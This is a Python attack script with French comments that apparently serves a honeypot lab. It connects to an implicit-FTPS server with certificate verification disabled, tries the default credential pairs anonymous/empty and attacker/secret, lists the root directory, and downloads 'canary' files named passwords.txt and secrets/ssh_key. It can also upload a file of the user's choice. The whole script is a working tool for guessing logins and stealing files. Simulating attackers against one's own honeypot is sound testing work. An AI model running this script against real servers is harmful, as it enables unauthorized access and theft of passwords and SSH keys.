#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Attacker Implicit-FTPS — script complet et corrigé

Fonctionnalités :
 - Connexion TLS implicite (SSL4) dès la création de socket
 - Test des comptes anonymous/"" et attacker/secret
 - NLST "." pour lister la racine
 - Téléchargement automatique de passwords.txt et secrets/ssh_key
 - Optionnel : upload d’un fichier (--upload)
 - argparse flexible (host, port, users, pwds, download, upload)
 - Logging console + fichier (~/attacker.log même sous sudo)
 - Coloration de la sortie (colorama)
 - Mesure des temps et résumé en fin de run
"""

import os
import sys
import ssl
import socket
import argparse
import logging
import time
import subprocess
from ftplib import FTP, error_perm

# → installer colorama si besoin
try:
    from colorama import init, Fore, Style
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "colorama"])
    from colorama import init, Fore, Style
init(autoreset=True)

# → arguments CLI
parser = argparse.ArgumentParser(description="Attacker Implicit-FTPS")
parser.add_argument("-H","--host",    default="192.168.100.51",
                    help="IP ou hostname du honeypot")
parser.add_argument("-P","--port",    default=2121, type=int,
                    help="Port FTPS implicite")
parser.add_argument("-U","--users",   nargs="+",
                    default=["anonymous","attacker"],
                    help="Liste des utilisateurs à tester")
parser.add_argument("-W","--pwds",    nargs="+",
                    default=["","secret"],
                    help="Liste des passwords correspondants")
parser.add_argument("-d","--download",
                    default="~/ftp_downloads",
                    help="Dossier local pour les téléchargements")
parser.add_argument("-u","--upload",
                    help="Chemin local d’un fichier à uploader")
args = parser.parse_args()

# → calculer le vrai home si on est en sudo
sudo_user = os.environ.get("SUDO_USER")
HOME = os.path.expanduser(f"~{sudo_user}") if sudo_user else os.path.expanduser("~")

# → préparation du dossier de téléchargements
DOWNLOAD_DIR = os.path.expanduser(args.download.replace("~", HOME))
try:
    os.makedirs(DOWNLOAD_DIR, exist_ok=True)
except PermissionError:
    DOWNLOAD_DIR = "/tmp/ftp_downloads"
    os.makedirs(DOWNLOAD_DIR, exist_ok=True)
    print(Fore.YELLOW + "[WARN] Permission denied, fallback download → /tmp/ftp_downloads")

# → configuration du logger
logger = logging.getLogger("attacker")
logger.setLevel(logging.INFO)
formatter = logging.Formatter("%(asctime)s %(levelname)s %(message)s")

# console handler
ch = logging.StreamHandler(sys.stdout)
ch.setFormatter(formatter)
logger.addHandler(ch)

# file handler
LOG_PATH = os.path.join(HOME, "attacker.log")
try:
    fh = logging.FileHandler(LOG_PATH)
    fh.setFormatter(formatter)
    logger.addHandler(fh)
    logger.info(f"Logging to {LOG_PATH}")
except PermissionError:
    logger.warning("Cannot write to file log, skipping file log")

# → fichiers canary à récupérer
CANARY_FILES = ["passwords.txt", "secrets/ssh_key"]

def try_user(user: str, pwd: str):
    t0 = time.time()
    logger.info(Fore.CYAN + f"Testing {user!r}/{pwd!r} on {args.host}:{args.port}")
    try:
        # 1) Connexion TCP
        raw_sock = socket.create_connection((args.host, args.port), timeout=10)

        # 2) TLS implicite
        ctx   = ssl._create_unverified_context()
        tls_s = ctx.wrap_socket(raw_sock, server_hostname=args.host)

        # 3) greffer ftplib.FTP sur la socket TLS
        ftp = FTP()
        ftp.sock = tls_s
        ftp.file = tls_s.makefile('r', encoding='utf-8', newline='\r\n')
        ftp.af = tls_s.family
        ftp.passiveserver = True

        # 4) bannière
        banner = ftp.getresp().strip()
        logger.info(Fore.YELLOW + banner)

        # 5) login
        resp = ftp.login(user, pwd)
        logger.info(Fore.GREEN + f"LOGIN OK: {resp}")

        # 6) listing racine
        files = ftp.nlst(".")
        files = [f.lstrip("./") for f in files]
        logger.info(Fore.MAGENTA + f"FILES: {files}")

        # 7) téléchargement des canary
        for cf in CANARY_FILES:
            if cf in files:
                out = os.path.join(DOWNLOAD_DIR, f"{user}_{cf.replace('/','_')}")
                logger.info(Fore.BLUE + f"↓ DL {cf} → {out}")
                with open(out, "wb") as fd:
                    ftp.retrbinary(f"RETR {cf}", fd.write)
                logger.info(Fore.GREEN + "   ✓ Download succeeded")

        # 8) upload optionnel
        if args.upload:
            fname = os.path.basename(args.upload)
            logger.info(Fore.BLUE + f"↑ UPLOAD {args.upload} → /{fname}")
            with open(os.path.expanduser(args.upload), "rb") as rd:
                ftp.storbinary(f"STOR {fname}", rd)
            logger.info(Fore.GREEN + "   ✓ Upload succeeded")

        ftp.quit()
        return True, time.time() - t0

    except error_perm as e:
        logger.warning(Fore.RED + f"Permission error for {user}: {e}")
    except Exception as e:
        logger.error(Fore.RED + f"Error for {user}: {e}", exc_info=True)

    return False, time.time() - t0

def main():
    logger.info("[*] START Attacker")
    results = []
    for idx, user in enumerate(args.users):
        pwd = args.pwds[idx] if idx < len(args.pwds) else ""
        ok, dur = try_user(user, pwd)
        results.append((user, ok, dur))

    logger.info("[*] SUMMARY")
    for user, ok, dur in results:
        status = Fore.GREEN + "OK" if ok else Fore.RED + "KO"
        logger.info(f" - {user:10s}: {status} in {dur:.2f}s")

    logger.info(f"Downloads stored in {DOWNLOAD_DIR}")
    logger.info("[*] END Attacker")

if __name__ == "__main__":
    main()
